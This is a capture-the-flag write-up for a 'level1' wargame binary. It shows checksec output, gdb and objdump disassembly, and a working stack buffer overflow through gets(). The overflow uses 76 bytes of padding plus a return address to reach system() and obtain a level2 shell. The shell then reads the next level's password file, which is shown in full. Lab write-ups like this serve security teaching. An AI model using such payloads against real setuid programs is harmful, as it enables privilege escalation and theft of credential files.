```shell
$> ls -la
[...]
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
[...]

$> ./level1
input: test

# program only asks for input and nothing happens
```

```shell
$> checksec --file level1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level1

# RELRO     : RElocation Read-Only, prevents GOT overwrite
# CANARY    : stack overflow protection, prevents buffer overflow
# NX        : Data Execution Prevention, prevents shellcode execution
# PIE       : Position Independent Executable, code is loaded at random address
# Here we have no RELRO, no CANARY, no NX and no PIE to execute the program.

$> gdb level1
(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x08048490 <+16>:    call   0x8048340 <gets@plt>
    [...]

# main contains a call to gets and nothing else
```

```shell
$> objdump -d level1
[...]
08048444 <run>:
    [...]
804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
    [...]
[...]
08048480 <main>:
[...]

# program contains a function named run that calls fwrite and system
```

gets() is a dangerous function because it reads from stdin and ends with a newline.  
So it is not safe because it should be overflowed.  

Let's do a classic overflow attack with gets.  
Use [this](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to found the offset of the EIP.

```shell
$> gdb level1
(gdb) r
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

# to arrive the next instruction (EIP), we need put 76 bytes of data.

$> python -c "print 'a' * 76 + '\x44\x84\x04\x08'" | ./level1
Good... Wait what?
Segmentation fault (core dumped)

# 08048444 reverses the order of the bytes, because it is a little endian machine
# Shell is not called but a segmentation fault ...
# execute with pipe is a non-interactive mode so system() is called but shutdown immediately
# to let execute become interactive we can use 'cat -'

$> python -c "print 'a' * 76 + '\x44\x84\x04\x08'" > /tmp/exploit

$> cat /tmp/exploit - | ./level1
Good... Wait what?
input: whoami
level2
input: cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```